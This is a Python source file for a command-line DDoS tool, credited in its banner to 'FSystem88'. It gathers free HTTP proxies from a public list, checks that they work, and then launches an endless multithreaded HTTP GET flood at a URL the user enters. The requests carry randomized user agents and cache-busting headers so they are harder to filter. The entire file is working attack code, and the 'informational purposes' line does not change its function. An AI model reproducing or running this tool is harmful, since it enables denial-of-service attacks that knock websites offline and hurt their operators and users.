#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests as r, os, threading, sys, random, re, time, click
from threading import Thread
from colorama import Fore,Style
from bs4 import BeautifulSoup

def check_prox(array, qtime):
	ip = r.post("http://fsystem88.ru/ip").text
	open("ddprox.txt", "w+").close()
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox, qtime))
		thread_list.append(t)
		t.start()
	time.sleep(qtime*4)

def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def useragent():
	global randuser
	randuser =['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36 OPR/67.0.3575.137',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko/20100101 Firefox/75.0',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv: 74.0) Gecko/20100101 Firefox/74.0',
	'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv: 75.0) Gecko/20100101 Firefox/75.0',
	'Mozilla/5.0 (Windows NT 10.0; rv: 68.0) Gecko/20100101 Firefox/68.0',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/81.0.4044.92 Safari/537.36',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, как Gecko) Версия/13.1 Safari/605.1.15',
	'Mozilla/5.0 (Linux; Android 10; MAR-LX1H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2986.42 Safari/537.36']

def randomString(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def check(ip, prox, qtime):
	try:
		ipx = r.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, verify=False, timeout=qtime).text
	except:
		ipx = ip
	if ip != ipx:
		print(Fore.GREEN+"{} good!".format(prox))
		f = open("ddprox.txt", "a+")
		f.write("{}\n".format(prox))
		f.close()
	else:
		print(Fore.RED+"{} bad".format(prox))

def ddos(prox, url):
	useragent()
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
	color = random.choice(colors)
	headers = {
			'User-Agent': random.choice(randuser),
			'Cache-Control': 'no-cache',
			'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
			'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
			'Keep-Alive': str(random.randint(110,120)),
			'Connection': 'keep-alive'
			}
	while True:
		thread_list = []
		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
		thread_list.append(t)
		t.start()

def start_ddos(prox, url, headers, proxies, color):
	try:
		req = r.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			print(color+"{} send requests...".format(prox))
	except:
		pass

@click.command()
@click.option('--proxy', help="File with a proxy")
def main(proxy):
	clear()
	def logo():
		print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\n[ Dev: FSystem88 ~ prod. by Ca$h&Мир® ]\n[ The program uses a simple type of DDoS attack\n  \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n"+Style.RESET_ALL)
	logo()
	url = input("URL: ")
	if url[:4] != "http":
		print(Fore.RED+"Enter the full link (example: http*://****.**/)"+Style.RESET_ALL)
		exit()
	qtime = input("Timeout of requests (default 5): ")
	try:
		if qtime == "":
			qtime = 5
		else:
			qtime = int(qtime)
	except:
		print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
		exit()
	if proxy == None:
		req = r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
		array = req.text.split()
		check_prox(array, qtime)
		proxfile = "ddprox.txt"
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			val = input("Found {} proxies in {}.\nCheck the proxy for validity? (y/n)".format(len(array), proxy))
			if val == "y":
				check_prox(array, qtime)
			else:
				print(Fore.YELLOW+"Cancel...")
			proxfile = proxy
		except FileNotFoundError:
			print(Fore.RED+"File {} not found. ".format(proxy)+Style.RESET_ALL)
			exit()
	clear()
	logo()
	fx = open(proxfile)
	xprox = fx.read().split()
	print(Fore.YELLOW+"URL: {}".format(url))
	print("Found {} proxies. Let's go...".format(len(xprox)))
	for prox in xprox:
		thread_list = []
		t = threading.Thread (target=ddos, args=(prox, url))
		thread_list.append(t)
		t.start()

main()
